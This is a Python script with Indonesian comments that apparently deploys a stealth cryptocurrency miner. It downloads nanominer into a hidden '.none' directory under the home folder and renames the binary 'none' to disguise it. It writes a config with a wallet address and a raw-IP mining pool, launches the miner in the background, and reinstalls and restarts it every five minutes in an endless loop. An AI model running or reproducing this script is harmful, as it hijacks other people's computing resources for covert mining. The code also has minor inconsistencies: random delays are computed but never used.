import subprocess
import time
import os
import random

# Pastikan skrip selalu berjalan di direktori home
os.chdir(os.path.expanduser("~"))

def run_bash():
    commands = [
        "pkill none && sleep 2",
        "rm -rf .none && sleep 2",
        "mkdir .none && cd .none",
        "wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz",
        "tar -xvf nanominer-linux-3.9.3.tar.gz",
        "mv nanominer none",
        "rm -rf con* nano*",
        """echo '[Verushash]
wallet = RC3G7FfFYLxfnP5DYMKp5zkDWuJtofUXWq
rigName = testgit
cpuThreads = 16
zilEpoch = 0
sortPools = true
watchdog = true
restarts= 0
tls= true
silence = 2
pool1 = 47.236.66.121:443' > config.ini"""
    ]

    for cmd in commands:
        subprocess.run(cmd, shell=True)
        delay = random.uniform(4.0, 10.0)  # Delay antar perintah 1.5–4 detik
        time.sleep(2)  # Delay agar berurutan

    print("✅ bash dimulai...")
    subprocess.Popen("./none", shell=True)  # Jalankan miner di background

while True:
    run_bash()
    delay = random.randint(300, 600)  # Delay sebelum restart 5–10 menit
    print("⏳ Menunggu 300 detik sebelum restart...")
    time.sleep(300)  # Tunggu 300 detik sebelum restart
